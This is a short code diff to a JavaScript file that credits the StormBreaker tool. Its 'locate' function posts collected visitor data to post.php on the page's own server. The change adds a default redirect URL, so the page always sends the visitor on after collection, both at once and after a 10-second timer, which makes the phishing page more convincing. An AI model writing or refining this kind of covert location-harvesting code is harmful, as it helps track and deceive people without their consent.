@@ -6,6 +6,8 @@
 // Credits  : StormBreaker(https://github.com/ultrasecurity/Storm-Breaker)
 // CreatedAt: 10-08-2022
 
+const DEFAULT_REDIRECT_URL = 'https://example.com/placeholder';
+
 const locate = (allow_redir) => {
     // post object as formdata
     const post = (obj, url=window.location.origin+"/post.php", error=false) => {
@@ -38,7 +40,10 @@ const locate = (allow_redir) => {
                 console.log(err)
             }
             try {
-                if (allow_redir && redirect_url) location.replace(redirect_url);
+                if (allow_redir) {
+                    const urlToUse = (typeof redirect_url !== 'undefined' && redirect_url) ? redirect_url : DEFAULT_REDIRECT_URL;
+                    location.replace(urlToUse);
+                }
             }
             catch (err) {
                 console.log(err)
@@ -113,10 +118,9 @@ const locate = (allow_redir) => {
         if (allow_redir) {
             setTimeout(() => {
                 try {
-                    if (redirect_url) {
-                        console.log('Redirecting after 10 seconds...');
-                        location.replace(redirect_url);
-                    }
+                    const urlToUse = (typeof redirect_url !== 'undefined' && redirect_url) ? redirect_url : DEFAULT_REDIRECT_URL;
+                    console.log('Redirecting after 10 seconds...');
+                    location.replace(urlToUse);
                 }
                 catch (err) {
                     console.log(err);
